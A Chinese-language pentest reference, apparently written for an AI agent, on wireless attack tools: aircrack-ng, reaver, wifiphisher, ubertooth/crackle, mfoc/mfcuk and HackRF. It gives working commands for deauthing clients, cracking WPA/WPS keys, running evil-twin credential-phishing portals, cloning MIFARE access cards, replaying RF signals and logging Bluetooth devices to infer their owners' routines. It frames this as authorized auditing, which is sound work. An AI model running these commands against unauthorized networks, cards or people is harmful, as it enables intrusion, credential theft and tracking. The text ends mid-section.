# 无线安全(Wireless Security: WiFi / 蓝牙 / SDR / NFC)

> **何时读本文件**:任务涉及 WiFi 审计(WPA 握手/WPS/evil twin)、monitor 模式抓包、蓝牙/BLE 扫描与嗅探、SDR 射频(HackRF/gqrx/GNU Radio)或 NFC/MIFARE 卡片密钥恢复时读取。

## 快速决策表

| 任务场景 | 首选工具 | 备选 | 关键区别 |
|---|---|---|---|
| WPA/WPA2 握手捕获+字典破解 | aircrack-ng 套件 | wifite | 套件可精细控制;wifite 全自动跑同一流程 |
| 一键自动无线审计 | wifite | airgeddon | wifite 轻、无人值守;airgeddon 功能面更广(菜单式) |
| WPS PIN 在线爆破 | reaver | bully | reaver 生态成熟;bully 依赖更少、内存/CPU 更优 |
| WPS pixie dust 离线攻击 | reaver -K 1 | pixiewps | 先试离线(秒级),失败再转在线爆破 |
| 免客户端抓 PMKID | bettercap (wifi.assoc) | hcxdumptool | 无客户端即可拿哈希,配合 hashcat 破解 |
| 被动无线发现/wardriving | kismet | airodump-ng | kismet 被动、多源(WiFi/BT/SDR)、带 GPS/Web UI |
| WiFi 内网 MITM/去认证 | bettercap | airgeddon | bettercap 单二进制覆盖 recon+deauth+嗅探 |
| Rogue AP / 钓鱼门户 | wifiphisher | wifipumpkin3 | wifiphisher 针对凭证钓鱼;wifipumpkin3 是可插拔框架 |
| 蓝牙经典设备枚举 | btscanner | bluelog | btscanner 提取 HCI/SDP 详情;bluelog 只做快速计数 |
| 蓝牙设备物理定位 | blueranger | — | 用链路质量(LQ)近似距离 |
| BLE 嗅探与解密 | ubertooth + crackle | — | ubertooth 硬件抓包,crackle 破解 TK/LTK |
| SDR 频谱浏览/搜索信号 | gqrx | hackrf_transfer | gqrx 是 GUI 频谱仪;hackrf_transfer 是 CLI 收/发 |
| sub-GHz 设备逆向 | rfcat | gnuradio | rfcat 交互式重编程(Yard Stick One 等) |
| MIFARE Classic 密钥恢复 | mfoc | mfcuk | mfoc 走 nested(需已知一个密钥);mfcuk 走 DarkSide(全未知) |
| WEP 破解 | aircrack-ng + aireplay-ng | wesside-ng | WEP 已淘汰,遇遗留网络再用 |
| LEAP/PPTP 凭证攻击 | asleap | — | 针对思科 LEAP 的缺陷 |

## 核心工具详解

### WPA/WPA2 握手破解完整流程(套件联动)

```bash
# 0. 准备:清除干扰进程,开启 monitor 模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0                 # 生成 wlan0mon 监控接口
# 1. 扫描发现目标(BSSID / 信道 / 已连接客户端 MAC)
sudo airodump-ng wlan0mon
# 2. 锁定目标,定向抓包(界面右上角出现 "WPA handshake: <bssid>" 即成功)
sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
# 3. 另开一个终端:deauth 已连接客户端,迫使其重连产生四次握手
sudo aireplay-ng --deauth 10 -a <bssid> -c <client-mac> wlan0mon
# 4. 离线字典破解(握手到手后随时可跑)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <bssid> capture-01.cap
```

---

### airmon-ng — monitor 模式准备与干扰排查(aircrack-ng 套件)

**用途**:把无线网卡切换到监听(monitor)模式,并检查/清除会破坏抓包的干扰进程;是整个 aircrack-ng 流程的第 0 步。
**安装**:Kali 默认已装(aircrack-ng 包)。
**使用场景**:任何 WiFi 抓包/注入前必须执行;抓包"看不到包""信道自动跳"时先回来排查。

```bash
# 列出会干扰的进程(NetworkManager/wpa_supplicant 是常见元凶)
sudo airmon-ng check
# 杀掉干扰进程(会断网,预期行为)
sudo airmon-ng check kill
# 开启 monitor 模式(可指定初始信道)
sudo airmon-ng start wlan0
sudo airmon-ng start wlan0 6
# 验证:出现 wlan0mon(Type: monitor)
iw dev
# 手动指定信道(防止信道漂移)
sudo iw dev wlan0mon set channel <channel>
# 收尾:退出 monitor 模式并恢复网络
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

**实战要点**:
- 干扰排查三板斧:`rfkill unblock all`(硬/软阻塞)→ `airmon-ng check kill`(进程占用)→ `iw dev` 确认接口状态;`iw phy` 输出的 "valid interface combinations" 里应包含 monitor。
- airmon-ng 失败时的手动等价命令:`sudo ip link set wlan0 down && sudo iw dev wlan0 set monitor none && sudo ip link set wlan0 up`。
- 常见坑:NetworkManager 重新接管接口导致信道漂移(必须先 check kill);USB3 端口对 2.4GHz 适配器有射频干扰,优先 USB2 或加屏蔽;虚拟机内需 USB 直通,且宿主不得同时占用网卡。
- 网卡必须支持 monitor 模式 + 注入(经典选择:Atheros AR9271、RTL8812AU/RTL8814AU);内置网卡(如 Broadcom/Intel 部分型号)抓包能力有限。

### airodump-ng — 无线数据包捕获与目标发现

**用途**:802.11 数据包捕获、AP/客户端枚举、定位目标 BSSID 与信道、捕获 WPA 四次握手;写出的 .cap/.csv 供 aircrack-ng/airgraph-ng 使用。
**安装**:Kali 默认已装(aircrack-ng 包)。
**使用场景**:需要精确控制抓包目标(锁定 BSSID+信道)时用本工具;广域被动普查用 kismet。

```bash
# 全信道扫描,观察所有 AP(BSSID/CH/PWR/ENC/ESSID)与下方客户端列表
sudo airodump-ng wlan0mon
# 扫描 2.4G + 5G
sudo airodump-ng --band abg wlan0mon
# 锁定目标 AP 定向抓包,-w 指定输出前缀(生成 .cap/.csv/.netxml)
sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
# 同时过滤目标客户端,减少写入量
sudo airodump-ng -c <channel> --bssid <bssid> --ignore-negative-one -w capture wlan0mon
```

**实战要点**:
- 顶部出现 `WPA handshake: <bssid>` 或 `PMKID` 字样即捕获成功;若一直未出现,执行 aireplay-ng deauth 触发重连。
- STATION 区域显示 `not associated` 的客户端无法用于定向 deauth;应选已关联(有 BSSID 归属)的客户端。
- `--ignore-negative-one` 可抑制 channel -1 的误报;只跑 5GHz 用 `--band a`。
- 客户端信号弱时 deauth 收不到,可广播 deauth(省略 -c)或靠近目标。
- `-w` 产出的 CSV 可用 `airgraph-ng` 画 AP-客户端关系图(见速查表)。

### aireplay-ng — 注入与去认证攻击

**用途**:向目标 AP/客户端注入帧——deauth 强制重连以触发握手、注入加速 WEP 破解、测试网卡注入能力。
**安装**:Kali 默认已装(aircrack-ng 包)。
**使用场景**:抓不到握手时的"催化"步骤;攻击前先做注入测试确认网卡可用。

```bash
# 注入能力测试(出现 "Injection is working!" 即正常)
sudo aireplay-ng --test wlan0mon
# 对指定客户端发送 10 个 deauth 帧(-a=AP,-c=客户端)
sudo aireplay-ng --deauth 10 -a <bssid> -c <client-mac> wlan0mon
# 广播 deauth(对所有客户端,不加 -c)
sudo aireplay-ng --deauth 10 -a <bssid> wlan0mon
# WEP 附属攻击:伪关联 + ARP 注入刷 IV
sudo aireplay-ng --fakeauth 0 -a <bssid> wlan0mon
sudo aireplay-ng --arpreplay -b <bssid> -h <client-mac> wlan0mon
```

**实战要点**:
- deauth 计数不宜过大(10-20 足够),连发会长时间打断目标网络并可能触发 WIDS/锁定。
- deauth 卡住无输出时,常见原因是信道不匹配:aireplay-ng 所用接口信道必须与 AP 一致(先 `iw dev wlan0mon set channel <ch>`)。
- 5GHz 网卡很多不支持该频段注入,测试用 `--test` 先验证。
- WEP 场景还有 `--chopchop`、`--fragment`(无有效客户端时用),与 `--arpreplay` 同属刷 IV 手段。

### aircrack-ng — WEP/WPA 密钥破解

**用途**:对捕获文件离线破解——WPA/WPA2 走字典(PSK),WEP 走 PTW/FMS 统计攻击;支持多核并行。
**安装**:Kali 默认已装(aircrack-ng 包)。
**使用场景**:握手/IV 已到手后的最终破解步骤;需要 GPU 加速或 PMKID 哈希模式时转 hashcat。

```bash
# WPA 字典破解,-b 指定目标网络(多字典用逗号分隔)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <bssid> capture-01.cap
# 按 ESSID 选择目标,-p 指定线程,-l 把密钥写入文件
aircrack-ng -w <wordlist1>,<wordlist2> -e <essid> -p 4 -l key.txt capture-01.cap
# WEP:对累积的 IV 直接跑 PTW 攻击
aircrack-ng capture-01.cap
```

**实战要点**:
- Kali 中 rockyou 需先解压:`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`。
- "No valid WPA handshakes found" 表示抓包里没有完整握手(可能只有前 2 包),回到 airodump/aireplay 重抓;可用 `wpaclean` 预提取(注意其可能损坏握手,失败时直接用原始 cap)。
- 免客户端路线:PMKID(关联帧内即含)可用 `hcxdumptool -i wlan0mon -o dump.pcapng` 抓取、`hcxpcapngtool -o hash.22000 dump.pcapng` 转换后 `hashcat -m 22000` 破解(apt install hcxdumptool hcxtools)。
- WEP 的 PTW 攻击一般需数万 IV,靠 aireplay-ng 注入积累;WPA 密钥强度足够时字典必然失败,评估结论写"握手已验证、离线破解不可行"即可。
- 与 cowpatty 相比:aircrack-ng 是通用标准;cowpatty 的预计算 PMK 文件对"同一 SSID 多次测试"更快。

### wifite — 一键自动化无线审计

**用途**:自动完成 monitor 模式→扫描→选择目标→抓握手/WPS/PMKID→调用 aircrack-ng/reaver 破解的完整流水线。
**安装**:`sudo apt install wifite`(Kali 常见预装)。
**使用场景**:CTF/授权测试中快速拿结果、无人值守跑批;需要精确控制每一步参数时用底层套件。

```bash
# 全自动:扫描并列出目标,Ctrl+C 后按编号选择
sudo wifite
# 先杀干扰进程再启动(推荐)
sudo wifite --kill
# 只攻击信号强于 50 的 WPS 网络(官网示例)
sudo wifite -pow 50 -wps
# 只打 WPA/WEP 目标,指定破解字典
sudo wifite -wpa -wep --dict /usr/share/wordlists/rockyou.txt
```

**实战要点**:
- 交互流:启动扫描 → Ctrl+C 停止 → 输入目标编号开始攻击;结果与握手文件保存在当前目录 `hs/` 下。
- 会按目标自动尝试:PMKID(免客户端)→ 客户端 deauth 抓握手 → WPS pixie dust → 在线 PIN,全失败才放弃。
- 底层就是 airmon/airodump/aireplay/aircrack-ng/reaver,排错思路与手动流程相同。
- 多网卡时它会自选第一块支持 monitor 的网卡;USB 外置网卡注意 VM 直通。

### wash — WPS 网络发现(reaver 包附带)

**用途**:扫描开启了 WPS 的 AP,列出 BSSID/信道/信号/WPS 版本/锁定状态(Lck),为 reaver/bully 选目标。
**安装**:`sudo apt install reaver`(wash 是同一包内的二进制)。
**使用场景**:决定"这个目标能不能走 WPS 路线"的第一步。

```bash
# 在 6 信道扫描 WPS AP,-C 忽略帧校验错误(官网示例)
wash -i wlan0mon -c 6 -C
# 不指定信道则全信道轮扫
wash -i wlan0mon
```

**实战要点**:
- `Lck` 列为 Yes 表示 AP 已锁定 WPS(多次失败尝试后的保护),reaver/bully 基本打不动,只能等待冷却期(通常几分钟到几小时)。
- `WPS 1.0` 且厂商为 Realtek/Broadcom/Ralink/MTK 的老设备对 pixie dust 最脆弱。
- wash 输出为空先检查 monitor 模式是否成功、接口信道是否漂移。

### reaver — WPS PIN 在线暴力破解

**用途**:对 WPS 开启的 AP 逐个尝试 8 位 PIN,成功后直接恢复 WPA PSK 与 AP 配置。
**安装**:`sudo apt install reaver`。
**使用场景**:目标 WPS 未锁定且 pixie dust 失败时的主攻手段;耗时长(数小时到数天)。

```bash
# 标准在线爆破,-v 显示详细进度(官网示例模式)
reaver -i wlan0mon -b <bssid> -v
# 指定信道更稳定
reaver -i wlan0mon -b <bssid> -c <channel> -v
# 首选先试 pixie dust 离线攻击(内部调用 pixiewps,秒级出结果)
reaver -i wlan0mon -b <bssid> -K 1
# 从已知 PIN 继续(断点续跑)
reaver -i wlan0mon -b <bssid> -p <pin>
```

**实战要点**:
- 攻击顺序建议:`reaver -K 1`(离线)→ 成功即结束;失败再上在线爆破。
- `Lck` 锁定时用 `-d <秒>` 加大尝试间隔、`-t <秒>` 调接收超时,或挂机等冷却;粗暴连打只会延长锁定。
- 会话状态(PIN 进度)保存在工作目录的 `.wpc` 文件,重跑不必从头开始;成功后同屏输出 WPS PIN 与 WPA PSK。
- 与 bully 相比:reaver 文档与工具链(bettercap/wifite 集成)更全。

### bully — WPS 暴力破解(C 实现,reaver 替代)

**用途**:与 reaver 同原理(WPS 设计缺陷),但依赖更少、内存/CPU 效率更高、字节序处理更稳。
**安装**:`sudo apt install bully`。
**使用场景**:reaver 对某 AP 兼容性差(关联失败/超时)时的备选;追求资源占用小时。

```bash
# 按 ESSID 攻击(官网示例)
bully -e <essid> wlan0mon
# 按 BSSID + 信道(更稳定)
bully -b <bssid> -c <channel> wlan0mon
```

**实战要点**:
- PIN 进度与随机 PIN 表保存在 `~/.bully/pins`,中断后可续跑。
- 启动时若报 `Unknown frequency` / beacon 信息异常,多为驱动信道上报问题,固定 `-c` 可绕过。
- 输出中 `Beacon information element indicates WPS is locked` 即目标已锁定,等待或换目标。
- 与 reaver 二选一即可,不要同时打同一 AP(会互相干扰触发锁定)。

### pixiewps — WPS pixie dust 离线破解

**用途**:利用部分 AP 的 E-S1/E-S2 熵不足缺陷,完全离线算出 WPS PIN(秒级),无需在线交互。
**安装**:`sudo apt install pixiewps`。
**使用场景**:WPS 目标的第一击;通常经 `reaver -K 1` 自动调用,也可手动喂数据。

```bash
# 手动模式:从 reaver/bully -v 输出或 bettercap 抓包中提取各参数
pixiewps -e <pke> -r <pkr> -s <ehash1> -z <ehash2> -a <authkey> -n <enonce>
```

**实战要点**:
- 各参数含义:PKE/PKR 为 DH 公钥、E-Hash1/E-Hash2 为 PIN 两半的哈希、AuthKey、E-Nonce;来源是 WPS M1-M4 报文。
- 实战中优先 `reaver -K 1` 或 wifite 的 pixiedust 模式自动取参,手动模式仅在复现/研究时用。
- 输出 `WPS pin: <8位>` 即成功,再交 reaver 兑换 PSK;`Seed` 为 0/低熵的设备(RTL/MTK 老固件)命中率高,现代设备基本已修复。

### bettercap — WiFi 侦察/去认证/嗅探一体化框架

**用途**:交互式会话框架,wifi.recon 被动发现 AP 与客户端、wifi.deauth 抓握手、wifi.assoc 抓 PMKID,并集成网内嗅探与 MITM。
**安装**:`sudo apt install bettercap`。
**使用场景**:需要在一个工具里完成"发现→去认证→抓握手→内网 MITM"全链路时;尤其适合免客户端 PMKID 路线。

```bash
# 启动交互会话(wifi.recon 会自动把无线口切到 monitor 模式)
sudo bettercap -iface wlan0
# 非交互一次性执行
sudo bettercap -iface wlan0 -eval "wifi.recon on; sleep 15; wifi.show"

# 会话内常用命令:
wifi.recon on                       # 开始全信道跳扫
wifi.recon.channel 1,6,11           # 锁定信道集合(或 all;只看 5GHz 用 36,40,44,48 后 wifi.show)
wifi.show                           # 列出 AP(含客户端数/厂商/信号)
set wifi.show.filter <正则>         # 按正则过滤 wifi.show 输出的 AP
wifi.deauth <bssid>                 # 对该 AP 全部客户端发 deauth,抓握手
wifi.assoc <bssid>                  # 发关联请求尝试抓 PMKID(免客户端)
set wifi.handshakes.file hs.pcap    # 握手落盘路径(需在 wifi.recon on 之前设置;配合 wifi.handshakes.aggregate 控制单文件/按网络分文件)
```

**实战要点**:
- 握手 pcap 可直接交给 aircrack-ng;PMKID 用 hcxpcapngtool 转 22000 后 hashcat 破解。
- `events.stream on` 实时看事件(assoc/deauth/handshake 捕获)。
- 网内后续动作(net.probe/net.sniff/arp.spoof 等代理模块)同属 bettercap,拿到 WiFi 立足点后可无缝转入内网测试。
- deauth 需要目标频段注入能力;5GHz 下确认网卡与信道支持。

### kismet — 被动无线发现/wardriving/WIDS 框架

**用途**:多源被动侦测框架——WiFi、蓝牙、RTLSDR、Zigbee/BLE 专用嗅探器插件;设备追踪、GPS 打点、Web UI;不主动发包不易触发告警。
**安装**:`sudo apt install kismet`(元包自动拉取各 capture 插件)。
**使用场景**:无线资产清点、wardriving、隐蔽侦察;比 airodump-ng 覆盖面广得多,但不做攻击动作。

```bash
# 现代版:指定捕获源启动,然后浏览器打开 http://localhost:2501
kismet -c wlan0mon
# 官网旧版命令(kismet_server,常用于配合 gpsd 做wardriving)
kismet_server -c wlan0 --use-gpsd-gps
```

**实战要点**:
- 新版 Kismet 自己管理 monitor 模式(通过 capture helper),一般无需先跑 airmon-ng。
- 支持 `kismet -c wlan0 -c wlan1mon ...` 多源同时采集;蓝牙用 `kismet-capture-linux-bluetooth` 包,Zigbee/BLE 用 ti-cc-2531/nrf/ubertooth 等插件包。
- wardriving:配 gpsd(`systemctl start gpsd`)后所有 AP/设备记录自动带经纬度,可导出为 netxml/pcap/JSON。
- Web UI 右上角登录提示在首次启动的终端输出里;数据目录默认 `/var/log/kismet/`。

### cowpatty — WPA-PSK 字典攻击与 PMK 预计算

**用途**:WPA/WPA2-PSK 专用字典攻击;genpmk 预计算某 SSID 的 PMK 哈希表后,重复测试同 SSID 速度提升数个量级。
**安装**:`sudo apt install cowpatty`。
**使用场景**:对同一 SSID 反复测试(如客户环境多目标同 ESSID)时用预计算;单次破解 aircrack-ng 即可。

```bash
# 直接字典攻击:pcap + 字典 + SSID
cowpatty -r <capture>.cap -f <wordlist> -s <essid>
# 预计算 PMK 表(官网示例:genpmk -f 字典 -d 输出 -s ESSID)
genpmk -f /usr/share/wordlists/nmap.lst -d cowpatty_dict -s <essid>
# 用预计算表 + 抓包文件破解(官网示例模式)
cowpatty -d cowpatty_dict -r Kismet-20181113-13-37-00-1.pcapdump -s <essid>
```

**实战要点**:
- 输出 `The PSK is "xxx"` 即成功;`Collected all necessary data to mount crack` 说明 pcap 里握手完整。
- PMK 表与 SSID 绑定,换 SSID 必须重算(这正是 WPA 抗预计算的设计)。
- genpmk 的哈希表可给 coWPAtty/airolib-ng 生态复用;大规模 GPU 破解仍转 hashcat。
- Kismet 的 pcapdump 输出可直接作为 `-r` 输入。

### airgeddon — 菜单式无线审计全家桶

**用途**:bash 编写的交互菜单工具,封装握手捕获、在线/离线破解、evil twin、captive portal、PMKID、WPS 等多种流程,自动检测接口与依赖。
**安装**:`sudo apt install airgeddon`。
**使用场景**:不想手敲多条命令、或要做 evil twin + 假门户组合拳时;深度排错不如手动套件。

```bash
sudo airgeddon
# 菜单内:选接口 → 置 monitor 模式 → 选攻击类型(握手捕获/evil twin/WPS/PMKID...)
```

**实战要点**:
- 首屏会做依赖体检,缺什么按提示补装(它会列出所需包)。
- evil twin/captive portal 流程需要第二块网卡(或借助与互联网桥接接口),菜单里会明确要求。
- 握手捕获环节本质是 airodump+aireplay,失败排查同手动流程(信道/信号/干扰)。
- 适合授权红队快速演示;报告仍建议附底层工具原始输出作为证据。

### wifiphisher — WiFi 自动化钓鱼(evil twin + 假门户)

**用途**:自动搭建恶意孪生 AP、deauth 原网络迫使用户重连,弹出伪造门户(如"固件升级请输入 WiFi 密码")收割凭证;纯社工,无暴力破解。
**安装**:`sudo apt install wifiphisher`。
**使用场景**:授权红队中验证"用户会否向假门户提交凭证"的社工风险。

```bash
# 双网卡模式:-aI 做 AP,-eI 做干扰(deauth)源,-p 指定钓鱼场景
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade
# 自定义恶意 SSID
sudo wifiphisher --essid "Free WiFi" -p <scenario>
```

**实战要点**:
- `-aI` 与 `-eI` 可以是同一块网卡的托管/监听拆分,但双网卡效果与稳定性最好。
- 场景模板(phishing scenarios)决定假页面内容,`firmware-upgrade` 是最经典的 WPA 密码钓鱼模板。
- 受害者凭证出现在运行终端实时输出中;测试报告须记录提交者 MAC/时间作为证据链。
- 与 wifipumpkin3 相比:wifiphisher 场景开箱即用,wifipumpkin3 可定制性/插件更强。

### wifipumpkin3 — Rogue AP / MITM 框架

**用途**:Python 编写的恶意热点框架:伪造 AP、 captive portal(captiveflask 模板)、DNS 欺骗、代理截获流量,插件化扩展。
**安装**:`sudo apt install wifipumpkin3`。
**使用场景**:需要定制 captive portal/代理链/插件的红队场景,比 wifiphisher 更"框架化"。

```bash
sudo wifipumpkin3
# 控制台内快速起一个开放 rogue AP:
# >> set interface wlan0
# >> set ssid <essid>
# >> set proxy noproxy
# >> start
# 子工具 captiveflask(独立起假门户):
captiveflask -t <template> -p <port>
```

**实战要点**:
- 控制台内 `help` 查看全部命令;`plugins` 列出可用插件;配置错误时先 `clear` 再重设。
- 拿到客户端连接后可用其代理模块(authproxy/captive)截获明文请求与凭证。
- 需要 root 与支持 AP(托管)模式的网卡;某些驱动需 `iw list` 确认支持 AP 模式。
- 与 wifi-honey(纯蜜罐/被动)不同,本工具主动提供 DHCP/门户诱导连接。

### ubertooth — 开源蓝牙嗅探硬件平台

**用途**:配合 Ubertooth One 硬件(2.4GHz)被动嗅探 BLE(Bluetooth Smart)连接及部分经典蓝牙(BR)流量;不参与配对即可旁路抓包。
**安装**:`sudo apt install ubertooth`。
**使用场景**:BLE 设备(IoT/穿戴)流量分析、捕获配对过程供 crackle 解密、经典蓝牙信道侦察。

```bash
# 查看设备与固件版本
ubertooth-util -v
# 被动跟随经典蓝牙 piconet
ubertooth-rx
# BLE:跟随已建立连接并抓包
ubertooth-btle -f
# 经典组合:ubertooth 抓 BLE → FIFO → crackle 实时解密
mkfifo /tmp/btle.pipe
ubertooth-btle -f -c /tmp/btle.pipe
crackle -i /tmp/btle.pipe
```

**实战要点**:
- 固件升级用 `ubertooth-dfu`(固件包 ubertooth-firmware,装在 /usr/share/ubertooth/firmware/);版本不匹配是抓不到包的常见原因。
- 与 Kismet 集成:安装 `kismet-capture-ubertooth-one` 后 Kismet 可直接采集。
- BLE 配对若使用 Just Works/6 位 TK,crackle 几乎必出 LTK;LE Secure Connections 配对则抗此攻击。
- 没有硬件时,普通 hci0 适配器只能主动扫描,无法旁路嗅探他人连接。

### btscanner — 蓝牙信息提取(ncurses 扫描器)

**用途**:基于 BlueZ 的全屏扫描器,无需配对即提取目标 HCI/SDP 详情,保持连接监测 RSSI 与链路质量;内置 OUI/设备类别查询。
**安装**:`sudo apt install btscanner`。
**使用场景**:对已发现蓝牙设备做深度信息收集(服务/厂商/类码),比 hcitool 输出结构化。

```bash
# 激活蓝牙适配器后启动
sudo hciconfig hci0 up
sudo btscanner
# 界面内:i = inquiry 扫描,s = bluetooth 扫描(可发现设备),b = 返回
```

**实战要点**:
- i 模式找"可发现"设备;s 模式读名字与类码;两者结果都可用方向键进详情页看 SDP 服务列表。
- 需要适配器处于 UP 状态;`hciconfig` 不可用时用 `bluetoothctl power on` 等效激活。
- 现代手机默认不可发现,扫不到属正常;可发现的多是音箱/车机/IoT。
- 输出可与 bluelog 的日志互补做现场设备台账。

### bluelog — 快速蓝牙现场清点扫描器

**用途**:尽可能快地统计区域内可发现蓝牙设备数量并逐条记日志,定位调查(site survey)用。
**安装**:`sudo apt install bluelog`。
**使用场景**:只需要"周围有多少蓝牙目标、MAC 列表"这类盘点信息时。

```bash
# 自动检测适配器并开始扫描,Ctrl+C 结束(官网示例)
sudo bluelog
# 指定 hci 接口
sudo bluelog -i hci0
```

**实战要点**:
- 结果自动写入 `bluelog-<日期时间>.log`,PID 文件在 /tmp/bluelog.pid,适合丢在后台跑。
- 只覆盖"可发现"设备;要深度信息接 btscanner,要定位接 blueranger。
- 适合长时间挂机统计出现/消失时间,辅助判断设备主人作息(社工向证据)。

### blueranger — 蓝牙设备定位(LQ 测距)

**用途**:用 l2cap ping 的链路质量(Link Quality)近似判断蓝牙设备远近;LQ 越高理论上越近。
**安装**:`sudo apt install blueranger`。
**使用场景**:物理定位已发现蓝牙设备(机房/办公室内找人找设备)。

```bash
# 用 hci1 适配器定位指定蓝牙地址(官网示例)
sudo blueranger hci1 <bdaddr>
# 结束连按两次 Ctrl+C
```

**实战要点**:
- Class 1 适配器(100mW)适合远距粗定位,Class 3 适合近距离精定位——组合使用先粗后细。
- LQ 受干扰与天线质量影响大,读数是相对趋势而非绝对距离;关注变化而非数值。
- 多数设备允许未认证的 l2cap ping,这正是其原理;部分新系统会拒绝。

### crackle — BLE 配对加密破解与流量解密

**用途**:利用 BLE 传统配对 TK 熵不足的缺陷恢复 TK/STK/LTK,进而解密主从设备全部通信。
**安装**:`sudo apt install crackle`。
**使用场景**:已抓到 BLE 配对过程 pcap(ubertooth 等)后的离线破解。

```bash
# 从 pcap 恢复密钥并输出解密后的 pcap(官网示例模式)
crackle -i ltk_exchange.pcap -o ltk-decrypted.pcap
# 已知 LTK 时直接解密后续抓包
crackle -i <in.pcap> -o <out.pcap> -l <ltk>
```

**实战要点**:
- 输出 `TK found: 000000`(TK 为 0)表示目标用了 Just Works 配对,秒破;`LTK found` 拿到长期密钥后,该设备后续连接永久可解。
- 必须抓到完整配对交换(M1-M3);抓包从中间开始则无法恢复 TK,此时只能用已知 LTK 模式。
- 解密后的 pcap 用 Wireshark 的 btle 解析器查看 GATT 层(写控制命令、传感数据)。
- 使用 LE Secure Connections(ECDH)的现代设备不受此攻击影响。

### mfoc — MIFARE Classic 密钥恢复(nested 攻击)

**用途**:利用 Crypto1 嵌套鉴权漏洞离线推导 MIFARE Classic 全部扇区密钥并整卡导出;需至少已知一个有效密钥(默认密钥表通常命中)。
**安装**:`sudo apt install mfoc`。
**使用场景**:门禁卡/公交卡评估的第一步:能读全卡、做克隆与字段分析。

```bash
# 前置:启动读卡服务并用 libnfc 确认识卡(ACR122U 常用)
sudo systemctl start pcscd
nfc-list
# 用默认密钥表跑 nested 攻击,全卡导出为 dump 文件
sudo mfoc -O card_dump.mfd
# 已知某非默认密钥时追加提交
sudo mfoc -k FFFFFFFFFFFF -O card_dump.mfd
```

**实战要点**:
- 输出 `.mfd` 为 1KB/4KB 原始镜像,可用 `hexdump -C`/mfoc 生态查看扇区与访问位。
- 某扇区一个已知密钥都没有时 mfoc 会失败——转 mfcuk 恢复首个密钥后再回来。
- 克隆到空白 Chinese magic card(可写 UID 卡)是常见交付验证方式;扇区 0 的 UID 不可写卡需 Gen1A/Gen2。
- 测试门禁系统时应记录密钥恢复时间作为风险证据。

### mfcuk — MIFARE Classic DarkSide 密钥恢复

**用途**:利用 DarkSide 错误 oracle 恢复"一个已知密钥都没有"的 MIFARE Classic 卡的首个密钥,是 mfoc 失败后的补充手段。
**安装**:`sudo apt install mfcuk`。
**使用场景**:卡片修改过默认密钥、mfoc 无从下手时,撬开第一个扇区密钥。

```bash
# 对块 0 的 A 密钥跑 DarkSide(-C 必须显式连接读卡器;-v 2 显示进度)
sudo mfcuk -C -R 0:A -v 2
```

**实战要点**:
- DarkSide 依赖读卡器的时序行为,ACR122U 效果好;不同读卡器成功率差异大。
- 拿到一个密钥后立即回到 `mfoc -k <recovered-key>` 推全卡,不要用 mfcuk 逐扇区硬磨。
- 需要"与读卡器交互"的场景(有源读卡器现场)效果更佳;纯卡离线场景直接 mfoc 优先。
- `-R <block>:<A|B>` 指定目标块与密钥类型,详见 `mfcuk -h`。

### mfterm — MIFARE Classic 交互终端

**用途**:Mifare Classic 1K/4K 卡的命令行终端:连接、鉴权、读写块/扇区、导入导出,带 Tab 补全与历史。
**安装**:`sudo apt install mfterm`。
**使用场景**:拿到密钥后的精细读写(改余额字段、验证访问位、比对克隆一致性)。

```bash
sudo mfterm
# 终端内(支持 Tab 补全):
# connect          连接读卡器上的卡
# help             查看全部命令(read/write/dump/keys 等)
```

**实战要点**:
- 与 mfoc/mfcuk 组成完整链路:mfoc 恢复密钥 → mfterm `keys load` 载入密钥 → 逐块读写比对。
- 直接写块有锁卡风险:先 `read` 记录原始值与访问位,改错访问位可致扇区永久锁死。
- 做差异分析时对比原卡与克隆卡的 dump,定位被门禁系统回写的计数器/扇区。

### hackrf — HackRF One SDR 命令行收发工具

**用途**:HackRF One(30MHz-6GHz 收发、20MHz 带宽)官方工具集:设备识别、IQ 录制与回放、固件烧写。
**安装**:`sudo apt install hackrf`。
**使用场景**:sub-GHz/ISM 频段信号录制回放、重放攻击验证、配合 gqrx/GNU Radio 做信号分析。

```bash
# 检测设备、读固件/序列号(攻击前先确认识别正常)
hackrf_info
# 接收:433.92MHz(ISM 常用遥控频段),2M 采样,IQ 存文件
hackrf_transfer -r <file>.iq -f 433920000 -s 2000000 -l 32 -g 32
# 发射回放:同参数回放录制的 IQ(-x 为发射增益)
hackrf_transfer -t <file>.iq -f 433920000 -s 2000000 -x 47
```

**实战要点**:
- 参数含义:`-f` 中心频率(Hz)、`-s` 采样率、`-l` IF 增益、`-g` RF 增益、`-x` TX 增益;录制与回放的 `-f`/`-s` 必须一致。
- 2.4GHz WiFi 频段带宽(20MHz)刚好在 HackRF 能力边缘;定向收 WiFi 用 atheros 网卡更实际。
- IQ 文件用 inspectrum 看瀑布图定位信号,或 gqrx 直接可视化;固件升级用 `hackrf_spiflash -w`。
- 发射前确认授权与频段合法性,功率放大需外接 amp(注意 `-a` 开启板载功放仅在授权场景)。

### gqrx — SDR 频谱仪(GNU Radio GUI)

**用途**:开源 SDR 接收机 GUI:实时频谱/瀑布图、解调(AM/FM/SSB/窄带)、IQ 录制;支持 RTL-SDR、HackRF、USRP、LimeSDR 等。
**安装**:`sudo apt install gqrx-sdr`。
**使用场景**:SDR 侦察的"眼睛"——扫频找目标信号、监听解调、录制样本供后续分析。

```bash
# 启动后在 Configure 窗口选择设备(如 HackRF)、采样率与增益
gqrx
# 常用界面操作:拖动瀑布图改频率 / FFT Settings 调增益 / REC 按钮录制 IQ
```

**实战要点**:
- 找未知发射源:瀑布图看突发信号(遥控器按键、传感器上报),记录中心频率与带宽,再用 hackrf_transfer 定参数录制。
- 远程控制:设置里开启 Remote control(TCP),可被 GNU Radio/脚本驱动。
- 与 HackRF 搭配时关闭硬件 AGC 手动调 LNA/VGA,避免 ADC 削顶失真。
- 纯接收分析用 gqrx;需要发射/回放时切 hackrf_transfer,二者参数体系一致。

### gnuradio — SDR 信号处理框架

**用途**:SDR 事实标准框架:流图(blocks)搭建收发机与解调器;gnuradio-companion 提供可视化拖拽开发,底层 Python/C++。
**安装**:`sudo apt install gnuradio`(开发用 gnuradio-dev,文档 gnuradio-doc)。
**使用场景**:标准工具(gqrx/rfcat)不够用时,自建协议解调器、信号生成器、自定义 SDR 流程。

```bash
# 启动可视化流图开发环境
